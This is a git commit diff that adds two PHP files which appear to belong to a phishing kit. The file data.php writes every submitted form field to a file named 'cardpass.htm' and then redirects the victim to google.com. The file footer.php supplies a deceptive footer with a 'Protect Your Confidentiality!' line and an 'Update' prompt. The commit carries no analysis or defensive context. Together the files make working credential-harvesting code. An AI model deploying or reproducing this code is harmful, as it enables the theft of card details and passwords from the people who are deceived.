06b8467cbf58affe1dd880425829b8d56def8faa
1zu0 <67436621+1zu0@users.noreply.github.com>
2023-07-26 19:23:16 +0200

    Files added

---
+++ data.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location:https://google.com/');
+$handle = fopen("cardpass.htm", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "<br>");
+}
+fwrite($handle, "<hr>");
+fclose($handle);
+exit;
+?>
---
+++ footer.php
@@ -0,0 +1,15 @@
+<footer>
+		<div class="container pageFooter">
+
+			<div id="contentCurve"></div>
+
+				<p class="text-muted disclaimer text-center ng-binding" ng-bind-html="'loginTermsOfService' | localize:termsAndConditionsUrl:privacyPolicyUrl" style="font-size: 11px">
+				    Protect Your Confidentiality!<br><br>
+				    By clicking "Update", you agree to our <a href="#" target="_blank">Terms of Service</a> and <a href="#" target="_blank">Privacy Policies</a>.
+				</p>
+
+		</div>
+	</footer>
+
+</body>
+</html>
